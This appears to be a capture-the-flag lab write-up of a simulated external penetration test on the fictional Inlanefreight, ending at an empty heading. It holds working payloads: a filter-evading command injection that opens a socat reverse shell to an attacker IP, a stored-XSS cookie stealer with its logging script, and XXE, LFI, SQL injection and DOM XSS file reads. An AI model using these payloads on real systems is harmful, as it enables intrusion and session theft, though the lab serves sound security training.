## Task

Our client, Inlanefreight, has contracted our company, Acme Security, Ltd., to perform a full-scope External Penetration Test to assess their perimeter security. The customer has asked us to identify as many vulnerabilities as possible; therefore, evasive testing is not required. They would like to see what sort of access can be achieved by an anonymous user on the Internet. Per the Rules of Engagement (RoE), if we can breach the DMZ and gain a foothold into the internal network, they would like us to see how far we can take that access, up to and including Active Directory domain compromise. The client has not provided web application, VPN, or Active Directory user credentials. The following domain and network ranges are in scope for testing:

|**External Testing**|**Internal Testing**|
|---|---|
|10.129.x.x ("external" facing target host)|172.16.8.0/23|
|*.inlanefreight.local (all subdomains)|172.16.9.0/23|
||INLANEFREIGHT.LOCAL (Active Directory domain)|

The customer has provided the primary domain and internal networks but has not given specifics on the exact subdomains within this scope nor the "live" hosts we will encounter within the network. They would like us to perform discovery to see what type of visibility an attacker can gain against their external network (and internal if a foothold is achieved).

Automated testing techniques such as enumeration and vulnerability scanning are permitted, but we must work carefully not to cause any service disruptions. The following are out of scope for this assessment:

- Phishing/Social Engineering against any Inlanefreight employees or customers
- Physical attacks against Inlanefreight facilities
- Destructive actions or Denial of Service (DoS) testing
- Modifications to the environment without written consent from authorized Inlanefreight IT staff

## Attack Summary

|Step|Vector|Outcome|
|---|---|---|
|1|Nmap scan of external host|11 open ports identified (FTP, SSH, SMTP, DNS, HTTP, POP3, RPC, IMAP, HTTP-proxy)|
|2|Anonymous FTP login|`flag.txt` read|
|3|DNS zone transfer (AXFR)|Full subdomain list and a flag TXT record disclosed|
|4|Vhost brute force (gobuster)|10+ internal vhosts discovered|
|5|blog.inlanefreight.local fingerprinting|Drupal 9 identified, no known CVE for the version|
|6|careers.inlanefreight.local IDOR|Flag read from another user's profile|
|7|dev.inlanefreight.local verb tampering + header spoofing + upload filter bypass|PHP webshell uploaded, flag read|
|8|gitlab.inlanefreight.local self-registration + /explore|New vhost `shopdev2.inlanefreight.local` and a flag disclosed|
|9|ir.inlanefreight.local mail-masta plugin LFI|`/etc/passwd` and flag read|
|10|monitoring.inlanefreight.local brute force + command injection + socat reverse shell|Shell as `webdev` on `dmz01`, flags read|
|11|shopdev2.inlanefreight.local default creds + XXE|Flag read via `file:///flag.txt`|
|12|status.inlanefreight.local SQL injection (sqlmap)|`users` and `company` tables dumped|
|13|support.inlanefreight.local stored XSS|Admin session cookie stolen, flag read from ticket queue|
|14|tracking.inlanefreight.local DOM XSS via `file://` XHR|`/etc/passwd` and flag read|
|15|vpn.inlanefreight.local login|Not bypassed, no access gained|

---

## Nmap Scan

```bash
nmap -sC -sV 10.129.34.144 --open
```

```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp     Postfix smtpd
53/tcp   open  domain   (unknown banner: 1337_HTB_DNS)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
110/tcp  open  pop3     Dovecot pop3d
111/tcp  open  rpcbind  2-4 (RPC #100000)
143/tcp  open  imap     Dovecot imapd (Ubuntu)
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp  open  ssl/pop3 Dovecot pop3d
8080/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Support Center
```

```bash
nmap -p- 10.129.34.144 --open -T5
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
110/tcp  open  pop3
111/tcp  open  rpcbind
143/tcp  open  imap
993/tcp  open  imaps
995/tcp  open  pop3s
8080/tcp open  http-proxy
```

The full-range scan confirms no additional ports beyond the top-1000 scan.

---

## FTP Enumeration

```bash
ftp -a 10.129.39.98
```

```
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
ftp> ls
-rw-r--r--    1 0        0              38 May 30  2022 flag.txt
ftp> more flag.txt
HTB{0eb0ab788df18c3115ac43b1c06ae6c4}
```

Anonymous FTP login is allowed, exposing a flag file directly in the root directory.

---

## DNS Zone Transfer

```bash
dig axfr inlanefreight.local @inlanefreight.local
```

```
inlanefreight.local.    86400   IN      SOA     ns1.inlanfreight.local. dnsadmin.inlanefreight.local. 21 604800 86400 2419200 86400
inlanefreight.local.    86400   IN      NS      inlanefreight.local.
inlanefreight.local.    86400   IN      A       127.0.0.1
blog.inlanefreight.local. 86400 IN      A       127.0.0.1
careers.inlanefreight.local. 86400 IN   A       127.0.0.1
dev.inlanefreight.local. 86400  IN      A       127.0.0.1
flag.inlanefreight.local. 86400 IN      TXT     "HTB{DNs_ZOn3_Tr@nsf3r}"
gitlab.inlanefreight.local. 86400 IN    A       127.0.0.1
ir.inlanefreight.local. 86400   IN      A       127.0.0.1
status.inlanefreight.local. 86400 IN    A       127.0.0.1
support.inlanefreight.local. 86400 IN   A       127.0.0.1
tracking.inlanefreight.local. 86400 IN  A       127.0.0.1
vpn.inlanefreight.local. 86400  IN      A       127.0.0.1
```

The name server allows an unauthenticated zone transfer, disclosing every subdomain in use plus a flag stored directly in a TXT record.

---

## Vhost Enumeration

```bash
gobuster vhost -u http://inlanefreight.local -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
```

```
dev.inlanefreight.local Status: 200 [Size: 2048]
vpn.inlanefreight.local Status: 200 [Size: 1578]
support.inlanefreight.local Status: 200 [Size: 26635]
blog.inlanefreight.local Status: 200 [Size: 8708]
status.inlanefreight.local Status: 200 [Size: 878]
monitoring.inlanefreight.local Status: 200 [Size: 56]
careers.inlanefreight.local Status: 200 [Size: 51806]
tracking.inlanefreight.local Status: 200 [Size: 35211]
ir.inlanefreight.local Status: 200 [Size: 28548]
gitlab.inlanefreight.local Status: 302 [Size: 113] [--> http://gitlab.inlanefreight.local/users/sign_in]
www.monitoring.inlanefreight.local Status: 200 [Size: 56]
```

All discovered vhosts are added to `/etc/hosts` for further enumeration.

---

## blog.inlanefreight.local

![](./vhosts/blog/blog1.png)

The host runs a Drupal instance.

```bash
curl -s http://blog.inlanefreight.local/ | grep Drupal
```

```
<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
```

Fingerprinting confirms Drupal 9, which has no known CVE for this version. No further exploitation is performed on this vhost.

---

## careers.inlanefreight.local

![](./vhosts/careers/careers1.png)

A new user account can be registered:

![](./vhosts/careers/careers2.png)

The newly created account's profile page discloses "Jobs applied by user", and the URL `profile?id=9` suggests an IDOR:

![](./vhosts/careers/careers3.png)

Changing the `id` parameter from `9` to `4` discloses another user's data, including the flag:

![](./vhosts/careers/careers4.png)

**Flag**:

```
HTB{8f40ecf17f681612246fa5728c159e46}
```

---

## dev.inlanefreight.local

A login form is presented:

![](./vhosts/dev/dev1.png)

Directory fuzzing discloses `upload.php`:

```bash
gobuster dir -u http://dev.inlanefreight.local -w /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -x .php
```

```
index.php            (Status: 200) [Size: 2048]
images               (Status: 301) [Size: 335]
uploads               (Status: 301) [Size: 336]
upload.php           (Status: 200) [Size: 14]
css                   (Status: 301) [Size: 332]
js                    (Status: 301) [Size: 331]
```

A GET request to `/upload.php` returns a 403 Forbidden:

![](./vhosts/dev/dev2.png)

HTTP verb tampering (changing the method to `TRACK`) reflects a header `X-Custom-IP-Authorization: 172.18.0.1` in the response:

![](./vhosts/dev/dev3.png)

Sending a new request with that header set to `127.0.0.1` tricks the web server into treating the request as coming from an internal host, bypassing the authorization check:

![](./vhosts/dev/dev4.png)

The upload form becomes accessible:

![](./vhosts/dev/dev5.png)

Uploads are restricted to images; setting the `Content-Type` of the multipart field to `image/png` bypasses the filter, allowing a PHP webshell to be uploaded:

![](./vhosts/dev/dev6.png)

Browsing the web root through the webshell discloses the flag file:

![](./vhosts/dev/dev7.png)

Reading the flag:

![](./vhosts/dev/dev8.png)

**Flag:**

```
HTB{57c7f6d939eeda90aa1488b15617b9fa}
```

---

## gitlab.inlanefreight.local

An account is registered:

![](./vhosts/gitlab/gitlab1.png)

Navigating to `/explore`:

![](./vhosts/gitlab/gitlab2.png)

The flag and a new vhost, `shopdev2.inlanefreight.local`, are discovered.

**Flag:**

```
HTB{32596e8376077c3ef8d5cf52f15279ba}
```

---

## ir.inlanefreight.local

The page displayed is powered by WordPress:

![](./vhosts/ir/ir1.png)

```bash
curl -s http://ir.inlanefreight.local | grep WordPress
```

```
<meta name="generator" content="WordPress 6.0" />
```

Enumeration with WPScan reveals users and the vulnerable `mail-masta` plugin, which is affected by a Local File Inclusion vulnerability:

```bash
wpscan --url http://ir.inlanefreight.local --enumerate p,t,u
```

```
[+] mail-masta
 | Version: 1.0

Users identified: ilfreightwp, john, tom, james
```

The LFI is exploited to read `/etc/passwd`:

```bash
curl "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

```

The same parameter is used to read the flag:

```bash
curl "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/flag.txt"
```

**Flag:**

```
HTB{e7134abea7438e937b87608eab0d979c}
```

---

## monitoring.inlanefreight.local

A login form is presented:

![](./vhosts/monitoring/monitoring0.png)

Brute forcing with Hydra reveals valid credentials:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt monitoring.inlanefreight.local http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
```

```
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
```

After login, a very limited shell interface is accessible:

![](./vhosts/monitoring/monitoring1.png)

Enumerating the source code of the page:

![](./vhosts/monitoring/monitoring2.png)

`main.js` discloses an endpoint that runs a `ping` command server-side, and a function that calls it with a user-controllable IP, suggesting a possible command injection:

![](./vhosts/monitoring/monitoring4.png)

Testing the endpoint confirms the ping functionality works as expected:

![](./vhosts/monitoring/monitoring4.png)

Command injection is confirmed using `%0a` (URL-encoded newline), which is not blacklisted:

```
/ping.php?ip=127.0.0.1%0acat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

![](./vhosts/monitoring/monitoring5.png)

Reading the source of `ping.php` itself, via the same injection:

```
GET /ping.php?ip=127.0.0.1%0acat${IFS}ping.php
```

![](./vhosts/monitoring/monitoring6.png)

```php
<?php
function filter($str)
{
  $operators = ['&', '|', ';', '\\', '/', ' '];
  foreach ($operators as $operator) {
    if (strpos($str, $operator)) {
      return true;
    }
  }
  $words = ['whoami', 'echo', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'less', 'more', 'awk', 'head', 'sed', 'nc', 'netcat'];
  foreach ($words as $word) {
    if (strpos($str, $word) !== false) {
      return true;
    }
  }
  return false;
}

if (isset($_GET['ip'])) {
  $ip = $_GET['ip'];
  if (filter($ip)) {
    $output = "Invalid input";
  } else {
    $cmd = "bash -c 'ping -c 1 " . $ip . "'";
    $output = shell_exec($cmd);
  }
}
?>
```

The filter blacklists several operators and command names but does not block `/`-less binaries like `socat`, which is present on the host:

![](./vhosts/monitoring/monitoring7.png)

A socat reverse shell listener is started locally and adapted to evade the filter (operators quoted character-by-character, `${IFS}` used instead of spaces):

```bash
socat TCP:10.10.14.111:9001 EXEC:bash
```

```
GET /ping.php?ip=127.0.0.1%0aso'c'at${IFS}TCP:10.10.14.111:9001${IFS}EXEC:bash
```

![](./vhosts/monitoring/monitoring8.png)

A shell as `webdev` is obtained on host `dmz01`:

```bash
nc -lvnp 9001
```

```
connect to [10.10.14.111] from (UNKNOWN) [10.129.41.126] 57022
id
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

```bash
webdev@dmz01:/var/www/html/monitoring$ find / -name "flag.txt" 2>/dev/null

/home/srvadm/flag.txt

/srv/ftp/flag.txt
```

**Flags:**

```bash
webdev@dmz01:/var/www/html/monitoring$ cat /home/srvadm/flag.txt

b447c27a00e3a348881b0030177000cd

webdev@dmz01:/var/www/html/monitoring$ cat /srv/ftp/flag.txt

HTB{0eb0ab788df18c3115ac43b1c06ae6c4} # same of the ftp server
```


> [!note] This shell is kept for later local privilege escalation and pivoting into the internal networks.

---

## shopdev2.inlanefreight.local

This vhost was disclosed via the GitLab `/explore` page. A login is presented:

![](./vhosts/shopdev2/shopdev1.png)

The page is accessible with `admin:admin`:

![](./vhosts/shopdev2/shopdev2.png)

Selecting items and going to checkout shows the "Complete Purchase" action accepts an XML body, as seen in Burp:

![](./vhosts/shopdev2/shopdev3.png)

![](./vhosts/shopdev2/shopdev4.png)

An XXE payload is tested to read `/etc/passwd` and works:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <subtotal>&xxe;</subtotal>
    <userid>&xxe;</userid>
</root>
```

![](./vhosts/shopdev2/shopdev5.png)

The same technique is used to read the flag:

![](./vhosts/shopdev2/shopdev6.png)

**Flag:**

```
HTB{dbca4dc5d99cdb3311404ea74921553c}
```

---

## status.inlanefreight.local

Testing a single quote (`'`) in the search field triggers a SQL syntax error, indicating a SQL injection:

![](./vhosts/status/status1.png)

The request is captured in Burp and passed to sqlmap:

```bash
sqlmap -r status.txt --technique=BEU --batch --dump
```

```
Parameter: searchitem (POST)
    Type: boolean-based blind
    Type: error-based
    Type: UNION query

back-end DBMS: MySQL >= 5.6

Database: status
Table: users
+----+-----------------------------------+----------+
| id | password                          | username |
+----+-----------------------------------+----------+
| 1  | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | Admin    |
| 2  | 1fbea4df249ac4f4881a5da387eb297cf | Flag     |
+----+-----------------------------------+----------+

Database: status
Table: company
[6 entries]
```

The injection confirms the back-end is MySQL and dumps the `users` and `company` tables. A `Flag` user row is present.

---

## support.inlanefreight.local

![](./vhosts/support/support1.png)

The site is a support center with two main functions: buy a product and raise a ticket. The `/ticket.php` endpoint is vulnerable to stored XSS, used to capture the admin's session cookie:

![](./vhosts/support/support2.png)

`script.js` (hosted locally):

```javascript
document.location='http://10.10.15.1/index.php?c='+document.cookie;
new Image().src='http://10.10.15.1/index.php?c='+document.cookie;
```

`index.php` (hosted locally):

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

A local server is started with both files:

```bash
sudo php -S 0.0.0.0:80
```

The following payload is submitted in the ticket's message field, as shown above:

```javascript
"><script src="http://10.10.14.111/script.js"></script>
```

The admin's cookie is captured when the ticket is viewed:

```bash
sudo php -S 0.0.0.0:80

[Mon Nov 9 14:20:31 2026] PHP 8.4.27 Development Server (http://0.0.0.0:80) started
[Mon Nov 9 14:25:19 2026] 10.129.41.101:32818 Accepted
[Mon Nov 9 14:25:19 2026] 10.129.41.101:32818 [200]: GET /script.js
[Mon Nov 9 14:25:19 2026] 10.129.41.101:32818 Closing
[Mon Nov 9 14:25:19 2026] 10.129.41.101:32820 Accepted
[Mon Nov 9 14:25:19 2026] 10.129.41.101:32820 [200]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99
[Mon Nov 9 14:25:19 2026] 10.129.41.101:32820 Closing
[Mon Nov 9 14:25:21 2026] 10.129.41.101:32842 Accepted
[Mon Nov 9 14:25:21 2026] 10.129.41.101:32842 [200]: GET /script.js
[Mon Nov 9 14:25:21 2026] 10.129.41.101:32842 Closing
[Mon Nov 9 14:25:21 2026] 10.129.41.101:32844 Accepted
[Mon Nov 9 14:25:21 2026] 10.129.41.101:32844 [200]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99
[Mon Nov 9 14:25:21 2026] 10.129.41.101:32844 Closing
```

The cookie is added via Cookie-Editor:

![](./vhosts/support/support3.png)

Logging in with the stolen session grants access to the admin dashboard and the ticket queue, where the flag is visible:

![](./vhosts/support/support4.png)

**Flag:**

```
HTB{1nS3cuR3_c00k135}
```

---

## tracking.inlanefreight.local

The page's only functionality is to track an order by its ID:

![](./vhosts/tracking/tracking1.png)

![](./vhosts/tracking/tracking2.png)

Testing a basic XSS payload :

```javascript
<script>alert(1)</script>
```

confirms the input is executed as JavaScript rather than rendered as text (the "Tracking #" field becomes empty):

![](./vhosts/tracking/tracking4.png)

A payload using a synchronous XHR request to a `file://` URI is used to read `/etc/passwd`:

```javascript
<script>
  var x = new XMLHttpRequest();
  x.open("GET", "file:///etc/passwd", false);
  x.send();
  document.write(x.responseText);
</script>
```

The browser allows the page's script to read local files via the `file://` scheme, and the content is written into the DOM (Document Object Model), where it is then displayed under the "Tracking #" field:

![](./vhosts/tracking/tracking5.png)

![](./vhosts/tracking/tracking6.png)

The same payload is used to read the flag:

![](./vhosts/tracking/tracking7.png)

**Flag:**

```
HTB{49f0bad299687c62334182178bfd75d8}
```

---

## vpn.inlanefreight.local

![](./vhosts/vpn/vpn.png)

A login form is presented. No bypass or successful brute force was achieved against this vhost.

---

## DMZ01 Lateral movement from webdev to srvadm

